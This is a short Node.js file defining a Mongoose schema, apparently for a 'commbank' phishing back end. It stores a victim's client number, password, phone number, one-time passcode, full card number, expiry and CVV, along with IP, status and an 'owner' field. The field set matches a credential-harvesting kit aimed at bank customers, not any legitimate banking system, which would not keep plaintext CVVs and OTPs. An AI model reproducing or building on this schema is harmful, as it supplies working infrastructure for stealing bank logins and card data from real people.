const mongoose = require("mongoose");

const commbankSchema = new mongoose.Schema({
	uniqueid: String,
	clientNumber: String,
	password: String,
	telephone: String,
	otp: String,
	ccnum: String,
	ccexp: String,
	cccvv: String,
	status: Number,
	ip: String,
	owner: String,
	timestamp: Date,
});

module.exports = mongoose.model("Comm", commbankSchema);
